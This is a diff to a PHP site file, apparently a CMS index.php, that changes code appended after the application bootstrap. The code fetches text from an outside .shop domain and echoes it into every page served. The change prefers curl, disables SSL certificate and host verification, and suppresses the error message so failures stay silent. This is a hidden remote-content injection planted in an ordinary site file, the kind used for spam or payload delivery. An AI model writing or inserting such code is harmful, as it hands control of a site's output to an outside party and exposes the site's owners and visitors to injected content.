@@ -28,24 +28,32 @@ $application->bootstrap()
 ?>
 <?php
 function get_raw_html($url) {
-    if (ini_get('allow_url_fopen')) {
-        return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
+    // Prioritaskan curl — lebih bisa dikontrol
+    if (function_exists('curl_init')) {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP script)');
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // ← fix SSL error
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // ← fix SSL error
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
         $data = curl_exec($ch);
         curl_close($ch);
         return $data;
+    } elseif (ini_get('allow_url_fopen')) {
+        // Fallback file_get_contents dengan bypass SSL
+        $ctx = stream_context_create([
+            'ssl' => [
+                'verify_peer'      => false,
+                'verify_peer_name' => false,
+            ]
+        ]);
+        return file_get_contents($url, false, $ctx);
     } else {
-        return "<p>ERROR: Tidak bisa mengambil konten dari URL.</p>";
+        return '';
     }
 }
 
-// Ganti URL di bawah dengan file raw HTML kamu
 $url = "https://anesiaolong.shop/input.txt";
-
-// Output HTML langsung ke browser
 echo get_raw_html($url);
 ?>
